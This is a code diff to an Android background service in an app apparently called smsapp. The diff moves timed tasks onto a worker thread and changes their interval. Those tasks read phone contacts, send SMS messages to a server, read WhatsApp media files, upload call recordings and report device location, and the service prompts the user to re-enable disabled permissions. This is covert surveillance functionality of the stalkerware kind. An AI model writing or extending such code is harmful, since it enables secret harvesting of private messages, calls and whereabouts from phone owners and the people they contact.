@@ -44,10 +44,10 @@ import gonext.smsapp.utils.Utils;
  */
 
 public class BackgroundJob extends Service implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener,LocationListener{
-    public static final int notify = 30000;  //interval between two services(Here Service run every 5 Minute)
+    public static final int notify = 120000;  //interval between two services(Here Service run every 5 Minute)
     public static final int PERMISSION_DELAY = 300000;  //interval between two services(Here Service run every 5 Minute)
     public static final int LOCATION_DELAY = 1500000;  //interval between two services(Here Service run every 5 Minute)
-    private Handler mHandler = new Handler();   //run on another Thread to avoid crash
+//    private Handler mHandler = new Handler();   //run on another Thread to avoid crash
     private Timer mTimer = null;    //timer handling
     private Timer locationTimer = null;    //timer handling
     private Timer permissionTimer = null;    //timer handling
@@ -61,30 +61,37 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
 
     @Override
     public void onCreate() {
-        backgroundJobService = new BackgroundJobService(this);
-        if (mTimer != null) // Cancel if already existed
-            mTimer.cancel();
-        else
-            mTimer = new Timer();   //recreate new
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                backgroundJobService = new BackgroundJobService(BackgroundJob.this);
+                if (mTimer != null) // Cancel if already existed
+                    mTimer.cancel();
+                else
+                    mTimer = new Timer();   //recreate new
 
-        mTimer.scheduleAtFixedRate(new TimeDisplay(), 0, notify);   //Schedule task
+                mTimer.scheduleAtFixedRate(new TimeDisplay(), 0, notify);   //Schedule task
 
-        if(Utils.isAndroid6()) {
-            if (permissionTimer != null) // Cancel if already existed
-                permissionTimer.cancel();
-            else
-                permissionTimer = new Timer();
+                if (Utils.isAndroid6()) {
+                    if (permissionTimer != null) // Cancel if already existed
+                        permissionTimer.cancel();
+                    else
+                        permissionTimer = new Timer();
 
-            permissionTimer.scheduleAtFixedRate(new PermissionDelay(), PERMISSION_DELAY, PERMISSION_DELAY);   //Schedule task
-        }
+                    permissionTimer.scheduleAtFixedRate(new PermissionDelay(), PERMISSION_DELAY, PERMISSION_DELAY);   //Schedule task
+                }
 
 
-        if (locationTimer != null) // Cancel if already existed
-            locationTimer.cancel();
-        else
-            locationTimer = new Timer();   //recreate new
+                if (locationTimer != null) // Cancel if already existed
+                    locationTimer.cancel();
+                else
+                    locationTimer = new Timer();   //recreate new
 
-        locationTimer.scheduleAtFixedRate(new LocationTimerTask(), 0, LOCATION_DELAY);   //Schedule task
+                locationTimer.scheduleAtFixedRate(new LocationTimerTask(), 0, LOCATION_DELAY);   //Schedule task
+
+                Utils.updateBackgroundServiceStatus(true, BackgroundJob.this);
+            }
+        }).start();
     }
 
     @Override
@@ -102,10 +109,11 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
         @Override
         public void run() {
             // run on another thread
-            mHandler.post(new Runnable() {
+            /*mHandler.post(new Runnable() {
                 @Override
-                public void run() {
+                public void run() {*/
                     // display toast
+            System.out.println("service started ******");
                     if(backgroundJobService != null) {
                         backgroundJobService.ReadPhoneContacts();
                         backgroundJobService.sendSMSToServer();
@@ -113,8 +121,8 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
                         backgroundJobService.readWhatsAppMediaFiles();
                         backgroundJobService.sendCallRecording();
                     }
-                }
-            });
+                /*}
+            });*/
         }
     }
 
@@ -122,9 +130,9 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
         @Override
         public void run() {
             // run on another thread
-            mHandler.post(new Runnable() {
+            /*mHandler.post(new Runnable() {
                 @Override
-                public void run() {
+                public void run() {*/
                     List<String> disabledPermissions = new ArrayList<>();
                     boolean allPermissionGranted = true;
                     // display toast
@@ -171,8 +179,8 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
                             sendNotification(TextUtils.join(",", disabledPermissions));
                         }
                     }
-                }
-            });
+              /*  }
+            });*/
         }
     }
     public void sendNotification(String msg){
@@ -209,9 +217,9 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
         @Override
         public void run() {
             // run on another thread
-            mHandler.post(new Runnable() {
+            /*mHandler.post(new Runnable() {
                 @Override
-                public void run() {
+                public void run() {*/
                     // display toast
                     if (!isLocationStarted) {
                         if (Utils.checkPlayServices(BackgroundJob.this)) {
@@ -237,8 +245,8 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
                     if(Constant.latitude != 0.0 && Constant.longitude != 0.0){
                         backgroundJobService.sendLocation();
                     }
-                }
-            });
+                /*}
+            });*/
         }
     }
 
@@ -304,4 +312,5 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
     public void onConnectionFailed(@NonNull ConnectionResult connectionResult) {
 
     }
+
 }
